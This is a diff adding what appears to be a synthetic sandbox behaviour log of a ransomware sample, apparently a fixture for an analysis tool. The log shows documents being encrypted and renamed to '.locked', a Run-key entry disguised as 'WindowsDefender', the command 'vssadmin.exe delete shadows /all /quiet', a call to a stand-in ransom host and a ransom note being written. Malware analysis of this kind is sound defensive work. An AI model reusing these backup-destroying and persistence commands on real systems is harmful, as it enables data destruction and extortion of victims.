@@ -1,0 +1,74 @@
+# Log Creation Date: 05.03.2025 14:22:07
+# Analyzer Version: 2024.4.1
+# Flog Txt Version 1
+
+Process:
+id = "0001"
+os_pid = "0x00000ABC"
+os_parent_pid = "0x0004"
+parent_id = "0000"
+image_name = "ransomware.exe"
+filename = "c:\\users\\victim\\desktop\\ransomware.exe"
+cmd_line = "\"c:\\users\\victim\\desktop\\ransomware.exe\" --silent"
+monitor_reason = "analysis_target"
+
+Region:
+id = "0010"
+name = "private_0x0000000000010000"
+
+Thread:
+id = "0001"
+os_tid = "0x00001B00"
+ [0001.000] GetCurrentProcess () returned 0xFFFFFFFFFFFFFFFF
+ [0001.001] CryptAcquireContextW (phProv=0x2000, szContainer=NULL, szProvider=NULL, dwProvType=24, dwFlags=0xF0000000) returned 1
+ [0001.002] CryptGenRandom (hProv=0x2000, dwLen=16, pbBuffer=0x3000) returned 1
+ [0001.003] CreateFileW (lpFileName="C:\\Users\\victim\\Documents\\important.docx", dwDesiredAccess=0xC0000000, dwShareMode=0x0, lpSecurityAttributes=NULL, dwCreationDisposition=0x3, dwFlagsAndAttributes=0x80, hTemplateFile=NULL) returned 0x00000054
+ [0001.004] ReadFile (hFile=0x54, lpBuffer=0x4000, nNumberOfBytesToRead=4096, lpNumberOfBytesRead=0x5000, lpOverlapped=NULL) returned 1
+ [0001.005] WriteFile (hFile=0x54, lpBuffer=0x6000, nNumberOfBytesToWrite=4096, lpNumberOfBytesWritten=0x7000, lpOverlapped=NULL) returned 1
+ [0001.006] CloseHandle (hObject=0x54) returned 1
+ [0001.007] MoveFileExW (lpExistingFileName="C:\\Users\\victim\\Documents\\important.docx", lpNewFileName="C:\\Users\\victim\\Documents\\important.docx.locked", dwFlags=0x1) returned 1
+ [0001.008] RegOpenKeyExW (hKey=2147483650, lpSubKey="Software\\Microsoft\\Windows\\CurrentVersion\\Run", ulOptions=0, samDesired=131097) returned 0
+ [0001.009] RegSetValueExW (hKey=0x100, lpValueName="WindowsDefender", Reserved=0, dwType=1, lpData="C:\\Users\\victim\\Desktop\\ransomware.exe") returned 0
+ [0001.010] DeleteFileW (lpFileName="C:\\Windows\\System32\\vssadmin.exe") returned 0x80070005
+ [0001.011] CreateProcessW (lpApplicationName=NULL, lpCommandLine="vssadmin.exe delete shadows /all /quiet", dwCreationFlags=8, lpEnvironment=NULL, lpCurrentDirectory=NULL, lpStartupInfo=0x8000, lpProcessInformation=0x9000) returned 1
+ [0001.012] InternetOpenW (lpszAgent="Mozilla/4.0 (compatible; MSIE 8.0)", dwAccessType=1, lpszProxyName=NULL, lpszProxyBypass=NULL, dwFlags=0) returned 0x4c9804
+ [0001.013] InternetOpenUrlW (hInternet=0x4c9804, lpszUrl="http://ransom.example.com/key?id=ABCDEF0123456789", dwHeadersLength=0, dwFlags=0x80000000, dwContext=0) returned 0x4c9808
+ [0001.014] HttpSendRequestW (hRequest=0x4c9808, lpszHeaders=NULL, dwHeadersLength=0, lpOptional=NULL, dwOptionalLength=0) returned 1
+ [0001.015] CoTaskMemFree (pv=0x746aa0)
+ [0001.016] GetSystemInfo (lpSystemInfo=0x1000)
+ [0001.017] WaitForSingleObject (hHandle=0x200, dwMilliseconds=4294967295) returned 0x0
+ [0001.018] ExitProcess (uExitCode=0)
+
+Thread:
+id = "0002"
+os_tid = "0x00001B01"
+ [0002.000] CreateFileW (lpFileName="C:\\Users\\victim\\Documents\\spreadsheet.xlsx", dwDesiredAccess=0xC0000000, dwShareMode=0x0, lpSecurityAttributes=NULL, dwCreationDisposition=3, dwFlagsAndAttributes=128, hTemplateFile=NULL) returned 0x55
+ [0002.001] ReadFile (hFile=0x55, lpBuffer=0x10000, nNumberOfBytesToRead=4096, lpNumberOfBytesRead=0x11000, lpOverlapped=NULL) returned 1
+ [0002.002] CryptEncrypt (hKey=0x3000, hHash=0x0, Final=1, dwFlags=0x0, pbData=0x10000, pdwDataLen=0x12000, dwBufLen=4096) returned 1
+ [0002.003] WriteFile (hFile=0x55, lpBuffer=0x10000, nNumberOfBytesToWrite=4096, lpNumberOfBytesWritten=0x13000, lpOverlapped=NULL) returned 1
+ [0002.004] MoveFileExW (lpExistingFileName="C:\\Users\\victim\\Documents\\spreadsheet.xlsx", lpNewFileName="C:\\Users\\victim\\Documents\\spreadsheet.xlsx.locked", dwFlags=1) returned 1
+ [0002.005] FindFirstFileW (lpFileName="C:\\Users\\victim\\*", lpFindFileData=0x14000) returned 0x56
+ [0002.006] FindNextFileW (hFindFile=0x56, lpFindFileData=0x14000) returned 1
+ [0002.007] CreateFileW (lpFileName="C:\\Users\\victim\\README_DECRYPT.txt", dwDesiredAccess=1073741824, dwShareMode=0, lpSecurityAttributes=NULL, dwCreationDisposition=2, dwFlagsAndAttributes=128, hTemplateFile=NULL) returned 0x57
+ [0002.008] WriteFile (hFile=0x57, lpBuffer=0x15000, nNumberOfBytesToWrite=512, lpNumberOfBytesWritten=0x16000, lpOverlapped=NULL) returned 1
+
+Process:
+id = "0002"
+os_pid = "0x00000BCE"
+os_parent_pid = "0x00000ABC"
+parent_id = "0001"
+image_name = "vssadmin.exe"
+filename = "c:\\windows\\system32\\vssadmin.exe"
+cmd_line = "vssadmin.exe delete shadows /all /quiet"
+monitor_reason = "child_process"
+
+Region:
+id = "0020"
+name = "private_0x0000000000020000"
+
+Thread:
+id = "0003"
+os_tid = "0x00002C00"
+ [0003.000] NtQuerySystemInformation (SystemInformationClass=0x5, SystemInformation=0x20000, SystemInformationLength=0x1000, ReturnLength=0x21000) returned 0x0
+ [0003.001] OpenProcess (dwDesiredAccess=0x1F0FFF, bInheritHandle=0, dwProcessId=2748) returned 0x58
+ [0003.002] VssDeleteSnapshots (pwszObjectName=NULL, eSourceObjectType=0x0, bForceDelete=TRUE) returned 0x80042302
